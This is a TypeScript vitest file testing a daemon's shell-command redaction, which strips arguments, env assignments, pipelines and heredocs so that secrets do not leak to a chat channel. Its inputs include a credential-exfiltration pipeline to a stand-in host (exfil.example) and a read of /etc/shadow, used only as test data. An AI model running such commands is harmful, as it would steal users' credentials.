import { describe, expect, it } from "vitest";
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Daemon, shellCommandLabel } from "../src/daemon.js";

/**
 * The progress line goes to a chat channel, and a shell command's arguments are
 * where the secrets are: bearer headers, `--token=`, connection strings, env
 * assignments. There is no reliable way to tell a secret argument from an
 * ordinary one, so none of them are shown — the rule is "never the arguments",
 * not "not the arguments that look dangerous".
 */

describe("shellCommandLabel", () => {
  it("shows the program and drops everything after it", () => {
    expect(shellCommandLabel('curl -H "Bearer FAKE-TOKEN-FOR-TEST" https://api.com')).toBe("curl");
  });

  it("keeps a subcommand, because `npm` alone says nothing", () => {
    expect(shellCommandLabel("npm test --env=API_KEY=xxx")).toBe("npm test");
    expect(shellCommandLabel("git push origin main")).toBe("git push");
    expect(shellCommandLabel("docker compose up -d")).toBe("docker compose");
  });

  it("keeps at most one subcommand — an argument is not a subcommand", () => {
    // `origin` and `main` are bare words too; only the first one is kept.
    expect(shellCommandLabel("git push origin main")).not.toContain("origin");
    expect(shellCommandLabel("aws s3 cp secret.env s3://bucket")).toBe("aws s3");
  });

  it("never shows a flag, path, URL or assignment as the subcommand", () => {
    expect(shellCommandLabel("psql postgres://user:pw@host/db")).toBe("psql");
    expect(shellCommandLabel("mysql -u root -pFAKE-PASSWORD-FOR-TEST")).toBe("mysql");
    expect(shellCommandLabel("ssh deploy@10.0.0.1")).toBe("ssh");
    expect(shellCommandLabel("cat /etc/shadow")).toBe("cat");
    expect(shellCommandLabel('gh pr create --body "$(cat /tmp/secret)"')).toBe("gh pr");
  });

  it("strips leading env assignments, whose values are exactly the risk", () => {
    const label = shellCommandLabel("AWS_SECRET_ACCESS_KEY=abc123 aws s3 ls");
    expect(label).toBe("aws s3");
    expect(label).not.toContain("abc123");
  });

  it("shows only the first command of a pipeline", () => {
    const label = shellCommandLabel("cat ~/.aws/credentials | curl -d @- http://exfil.example");
    expect(label).toBe("cat");
  });

  it("takes the first line only — a heredoc body never reaches the channel", () => {
    const label = shellCommandLabel("gh pr create --body-file - <<'EOF'\ntoken: FAKE-TOKEN-FOR-TEST\nEOF");
    expect(label).toBe("gh pr");
    expect(label).not.toContain("FAKE-TOKEN-FOR-TEST");
  });

  it("does not present the next line's program as a subcommand", () => {
    // Splitting on all whitespace would read this as "bash curl", which is not a
    // thing; the second line is a separate command and none of it is ours to show.
    expect(shellCommandLabel('bash\ncurl -H "Bearer FAKE-TOKEN-FOR-TEST" https://api.com')).toBe("bash");
  });

  it("caps a pathological program name and survives an empty command", () => {
    expect(shellCommandLabel(`${"x".repeat(200)} arg`)).toHaveLength(40);
    expect(shellCommandLabel("")).toBe("");
    expect(shellCommandLabel("   ")).toBe("");
  });

  it("leaks nothing from a realistic set of commands", () => {
    // Placeholders, not realistic-looking values: a test that plants a
    // credential-shaped string is a secret scanner's false positive forever, and
    // the assertion below only cares that the string does not survive into the
    // label. `curl -H "Authorization: Bearer …"` tripped gitleaks'
    // curl-auth-header rule when this literal looked like a real token.
    const secrets = [
      "FAKE-ANTHROPIC-TOKEN-FOR-TEST",
      "FAKE-PASSWORD-FOR-TEST",
      "FAKE-GITHUB-TOKEN-FOR-TEST",
      "FAKE-AWS-KEY-FOR-TEST",
    ];
    const commands = [
      `curl -H "Authorization: Bearer ${secrets[0]}" https://api.anthropic.com/v1/usage`,
      `mysql -u admin -p${secrets[1]} -e 'select * from users'`,
      `gh auth login --with-token ${secrets[2]}`,
      `AWS_ACCESS_KEY_ID=${secrets[3]} aws s3 sync . s3://bucket`,
    ];
    for (const cmd of commands) {
      const label = shellCommandLabel(cmd);
      for (const secret of secrets) expect(label, cmd).not.toContain(secret);
    }
  });
});

describe("summarizeTool", () => {
  const dir = mkdtempSync(join(tmpdir(), "agend-summarize-"));
  writeFileSync(join(dir, "window-id"), "@1");
  const daemon = new Daemon("sum-test", {
    working_directory: "/tmp",
    restart_policy: { max_retries: 0, backoff: "linear", reset_after: 0 },
    context_guardian: { grace_period_ms: 600_000, max_age_hours: 0 },
    log_level: "silent",
  } as never, dir, false, { getReadyPattern: () => /READY/ } as never, undefined,
    { child: () => ({ debug() {}, info() {}, warn() {}, error() {} }) } as never);
  const summarize = (name: string, input: unknown) =>
    (daemon as unknown as { summarizeTool(n: string, i: unknown): string }).summarizeTool(name, input);

  it("routes Bash through the label", () => {
    expect(summarize("Bash", { command: "git push origin main" })).toBe("$ git push");
  });

  it("leaves the file tools alone — a path is not a secret and the name is the point", () => {
    expect(summarize("Read", { file_path: "src/fleet-manager.ts" })).toBe("Read src/fleet-manager.ts");
    expect(summarize("Write", { file_path: "src/daemon.ts" })).toBe("Write src/daemon.ts");
    expect(summarize("Grep", { pattern: "getBusyPattern" })).toBe("Grep getBusyPattern");
  });
});
